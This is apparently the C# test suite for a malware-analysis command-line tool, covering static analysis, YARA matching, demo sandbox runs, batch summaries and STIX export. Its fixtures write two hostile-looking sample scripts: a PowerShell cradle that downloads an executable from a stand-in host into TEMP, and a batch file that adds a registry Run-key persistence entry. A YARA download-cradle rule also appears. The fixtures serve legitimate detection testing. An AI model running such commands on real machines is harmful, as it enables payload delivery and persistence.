using System.Text.Json;
using Blazma.Analysis.Static;
using Blazma.Analysis.Yara;
using Blazma.Cli;
using Blazma.Sandbox.Providers.Demo;

namespace Blazma.Cli.Tests;

/// <summary>Runs whole commands against a temporary data folder and the demo environment.</summary>
public sealed class CliRunTests : IDisposable
{
    private readonly string _root = Path.Combine(Path.GetTempPath(), "blazma-cli-" + Guid.NewGuid().ToString("N"));
    private readonly string _data;
    private readonly string _samples;

    public CliRunTests()
    {
        _data = Path.Combine(_root, "data");
        _samples = Path.Combine(_root, "samples");
        Directory.CreateDirectory(_data);
        Directory.CreateDirectory(_samples);
        File.WriteAllText(Path.Combine(_data, "settings.json"), """{"advanced":{"demoSpeed":0}}""");
        File.WriteAllText(Path.Combine(_samples, "one.ps1"), "Invoke-WebRequest http://example.test/a -OutFile $env:TEMP\\a.exe");
        File.WriteAllText(Path.Combine(_samples, "two.bat"), "@echo off\r\nreg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v x /d y");
    }

    public void Dispose()
    {
        try { Directory.Delete(_root, recursive: true); } catch (IOException) { } catch (UnauthorizedAccessException) { }
    }

    private async Task<(int Code, string Out, string Err)> Run(params string[] args)
    {
        using var stdout = new StringWriter();
        using var stderr = new StringWriter();
        var app = new CliApp(stdout, stderr)
        {
            AnalyzeStatic = (path, options, ct) =>
                new StaticAnalyzer(options.YaraFolder is { } y && Directory.Exists(y) ? YaraRuleSet.LoadFolder(y) : null, options.DetectCapabilities).AnalyzeAsync(path, ct),
        };
        var code = await app.RunAsync([.. args, "--data", _data], CancellationToken.None);
        return (code, stdout.ToString(), stderr.ToString());
    }

    private string Sample(string name) => Path.Combine(_samples, name);

    [Fact]
    public async Task Help_lists_commands_and_exit_codes()
    {
        var (code, output, _) = await Run("help");
        Assert.Equal(ExitCodes.Ok, code);
        Assert.Contains("blazma analyze", output);
        Assert.Contains("30 critical", output);
    }

    [Fact]
    public async Task Unknown_command_is_a_usage_error()
    {
        var (code, _, err) = await Run("explode");
        Assert.Equal(ExitCodes.Usage, code);
        Assert.Contains("Unknown command", err);
    }

    [Fact]
    public async Task Static_prints_hashes_and_capabilities()
    {
        var (code, output, _) = await Run("static", Sample("one.ps1"));
        Assert.Equal(ExitCodes.Ok, code);
        Assert.Contains("SHA-256", output);
        Assert.Contains("PowerShell", output);
    }

    [Fact]
    public async Task Static_json_is_a_static_report()
    {
        var (code, output, _) = await Run("static", Sample("one.ps1"), "--json");
        Assert.Equal(ExitCodes.Ok, code);
        using var doc = JsonDocument.Parse(output);
        Assert.Equal("one.ps1", doc.RootElement.GetProperty("sample").GetProperty("fileName").GetString());
    }

    [Fact]
    public async Task Analyze_returns_the_verdict_as_exit_code_and_saves_to_history()
    {
        var (code, output, _) = await Run("analyze", Sample("one.ps1"), "--env", DemoSandboxProvider.ProviderId, "--json");
        using var doc = JsonDocument.Parse(output);
        var root = doc.RootElement;
        Assert.True(root.GetProperty("demo").GetBoolean());
        Assert.Equal(root.GetProperty("exitCode").GetInt32(), code);
        Assert.NotEqual(ExitCodes.Error, code);

        var (listCode, list, _) = await Run("list", "--json");
        Assert.Equal(ExitCodes.Ok, listCode);
        Assert.Contains(root.GetProperty("id").GetString()!, list.Replace("-", ""));
    }

    [Fact]
    public async Task Internet_needs_explicit_confirmation()
    {
        var (code, _, err) = await Run("analyze", Sample("one.ps1"), "--env", "demo", "--network", "internet");
        Assert.Equal(ExitCodes.Usage, code);
        Assert.Contains("--allow-internet", err);
    }

    [Fact]
    public async Task Unknown_environment_and_profile_are_rejected()
    {
        Assert.Equal(ExitCodes.Usage, (await Run("analyze", Sample("one.ps1"), "--env", "cloud")).Code);
        Assert.Equal(ExitCodes.Usage, (await Run("analyze", Sample("one.ps1"), "--profile", "turbo")).Code);
    }

    [Fact]
    public async Task Analyze_writes_a_report_and_export_finds_it_by_short_id()
    {
        var html = Path.Combine(_root, "r.html");
        var (code, output, _) = await Run("analyze", Sample("one.ps1"), "--env", "demo", "--json", "--report", html);
        Assert.NotEqual(ExitCodes.Error, code);
        Assert.True(new FileInfo(html).Length > 1000);

        var id = JsonDocument.Parse(output).RootElement.GetProperty("id").GetString()!;
        var stix = Path.Combine(_root, "r.stix.json");
        var (exportCode, _, err) = await Run("export", id[..8], "--format", "stix", "--out", stix);
        Assert.True(exportCode == ExitCodes.Ok, err);
        using var bundle = JsonDocument.Parse(File.ReadAllText(stix));
        Assert.Equal("bundle", bundle.RootElement.GetProperty("type").GetString());
    }

    [Fact]
    public async Task Export_rejects_an_unknown_id()
    {
        var (code, _, _) = await Run("export", "ffffffff", "--format", "json", "--out", Path.Combine(_root, "x.json"));
        Assert.Equal(ExitCodes.Usage, code);
    }

    [Fact]
    public async Task Batch_analyzes_every_file_and_writes_a_summary()
    {
        var csv = Path.Combine(_root, "summary.csv");
        var (code, output, _) = await Run("batch", _samples, "--env", "demo", "--summary", csv);
        Assert.NotEqual(ExitCodes.Usage, code);
        Assert.Contains("one.ps1", File.ReadAllText(csv));
        Assert.Contains("two.bat", File.ReadAllText(csv));
        Assert.Equal(3, File.ReadAllLines(csv).Length);
        Assert.Contains("/100", output);
    }

    [Fact]
    public async Task Static_reports_matches_from_the_users_yara_folder()
    {
        Directory.CreateDirectory(Path.Combine(_data, "yara"));
        File.WriteAllText(Path.Combine(_data, "yara", "cradle.yar"), """
            rule PowerShell_Download_Cradle { strings: $a = "Invoke-WebRequest" nocase condition: $a }
            """);
        var (code, output, _) = await Run("static", Sample("one.ps1"));
        Assert.Equal(ExitCodes.Ok, code);
        Assert.Contains("PowerShell_Download_Cradle", output);
    }

    [Fact]
    public async Task Environments_lists_the_demo_as_ready()
    {
        var (code, output, _) = await Run("envs");
        Assert.Equal(ExitCodes.Ok, code);
        Assert.Contains("demo", output);
        Assert.Contains("Ready", output);
    }
}
